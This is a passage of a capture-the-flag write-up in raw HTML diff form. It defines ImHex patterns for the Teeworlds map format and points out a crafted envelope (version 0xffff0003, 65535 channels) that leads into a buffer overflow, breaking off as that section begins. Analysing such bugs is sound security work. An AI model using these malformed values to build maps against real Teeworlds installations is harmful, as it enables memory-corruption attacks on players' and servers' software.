+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    RGB &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    RGBA
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CMapItemImage&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_Version;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_Width;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_Height;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_External;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_ImageName;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_ImageData;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (m_Version &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        image_format m_Format;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CMapItemGroup&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_Version;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_OffsetX;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_OffsetY;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_ParallaxX;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_ParallaxY;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_StartLayer;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_NumLayers;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (m_Version &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s32 m_UseClipping;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s32 m_ClipX;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s32 m_ClipY;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s32 m_ClipW;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s32 m_ClipH;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s32 m_aName[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;enum&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;tilemap_flags&lt;/span&gt; :&lt;span style=&#34;color:#a6e22e&#34;&gt;s32&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Tiles &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Game  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CMapItemLayerTilemap&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// enum { CURRENT_VERSION=4 };
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_Version;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_Width;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_Height;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    tilemap_flags m_Flags;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    CColor m_Color;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_ColorEnv;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_ColorEnvOffset;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_Image;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_Data;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_aName[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CMapItemLayerQuads&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// enum { CURRENT_VERSION=2 };
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_Version;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_NumQuads;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_Data;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_Image;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_aName[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;enum&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;layer_type&lt;/span&gt; : &lt;span style=&#34;color:#a6e22e&#34;&gt;s32&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Invalid,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Game,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Tiles,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Quads
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CMapItemLayer&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_Version;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    layer_type m_Type;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_Flags;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (m_Type &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; layer_type::Tiles) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        CMapItemLayerTilemap m_Tilemap;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (m_Type &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; layer_type::Quads) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        CMapItemLayerQuads m_Quads;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CMapItemVersion&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_Version;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;With that big chunk of the file structure out of the way, let&amp;rsquo;s have a closer look at the relevant parts: Envelopes and Envelope Points.&lt;/p&gt;
+&lt;p&gt;An Envelope groups a range of points. The type of these points is defined by the number of channels. Furthermore the version of the envelope influences the parsing of the points for that envelope. Since all envelopes should have the same version, we can simply track the required point version with a global variable.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Rust&#34; data-lang=&#34;Rust&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;s32 POINT_VERSION &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;// track point version
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CMapItemEnvelope&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// enum { CURRENT_VERSION=3 };
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    s32 m_Version;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_Channels;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_StartPoint;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_NumPoints;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_aName[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (m_Version &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) {   &lt;span style=&#34;color:#75715e&#34;&gt;// technically this should be &amp;gt;1,
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;                            &lt;span style=&#34;color:#75715e&#34;&gt;// but for successfully reading the corrupted sample map
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;                            &lt;span style=&#34;color:#75715e&#34;&gt;// without parsing the offsets,
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;                            &lt;span style=&#34;color:#75715e&#34;&gt;// this change is needed to not fail
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        s32 m_Synchronized;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (m_Version &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        POINT_VERSION &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Each point has a time and a curve type. Furthermore it features 4 values which are used according to the channels value of the containing envelope. With version 2, a point is increased by 4 tangent arrays containing 4 values each.
+For getting the &lt;code&gt;sizeof&lt;/code&gt; operator used in &lt;code&gt;CDatafileItem&lt;/code&gt; to work, we have to define the &lt;code&gt;CEnvPoint&lt;/code&gt; struct as static. This is possible, since all points have the same layout. Furthermore, the static definition optimizes the parsing of the file.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Rust&#34; data-lang=&#34;Rust&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;enum&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;curve_id&lt;/span&gt; : &lt;span style=&#34;color:#a6e22e&#34;&gt;s32&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Step   &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,      &lt;span style=&#34;color:#75715e&#34;&gt;// (abrupt drop at second value)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    Linear &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,      &lt;span style=&#34;color:#75715e&#34;&gt;// (linear value change)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    Slow   &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,      &lt;span style=&#34;color:#75715e&#34;&gt;// (first slow, later much faster value change)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    Fast   &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,      &lt;span style=&#34;color:#75715e&#34;&gt;// (first fast, later much slower value change)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    Smooth &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,      &lt;span style=&#34;color:#75715e&#34;&gt;// (slow, faster, then once more slow value change)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    Bezier &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;       &lt;span style=&#34;color:#75715e&#34;&gt;// (Vanilla only, very customizable curve)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CEnvPoint&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_Time; &lt;span style=&#34;color:#75715e&#34;&gt;// in ms
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    curve_id m_Curvetype;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s32 m_aValues[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// 1-4 depending on envelope (22.10 fixed point)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (POINT_VERSION &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// bezier curve only
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// dx in ms and dy as 22.10 fxp
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        s32 m_aInTangentdx[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s32 m_aInTangentdy[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s32 m_aOutTangentdx[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s32 m_aOutTangentdy[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;//bool operator&amp;lt;(const CEnvPoint&amp;amp; other) const { return m_Time &amp;lt; other.m_Time; }
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;} [[&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt;]];
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;With these information we can take a closer look at the provided map and it&amp;rsquo;s effect on Teeworlds.
+&lt;img src=&#34;/img/realworldctf5-teewars-pattern_data.png&#34; alt=&#34;Screenshot of the pattern data in ImHex&#34;&gt;
+It features 27 items from which 6 are envelopes. All envelopes except the one with ID 1 are version 3 and fulfill the relevant constraints. The envelope with ID 1 has a version of -65533 (0xffff0003) and features 2 points with 65535 channels each.&lt;/p&gt;
+&lt;p&gt;Since we now know the map file, let&amp;rsquo;s have a closer look at the broken part of the parsing.&lt;/p&gt;
+&lt;h2 id=&#34;buffer-overflow&#34;&gt;Buffer overflow&lt;/h2&gt;
+&lt;p&gt;The faulty function will load all points of all envelopes from the map and return them as array. It starts by locating and loading the data of all points from the map.&lt;/p&gt;
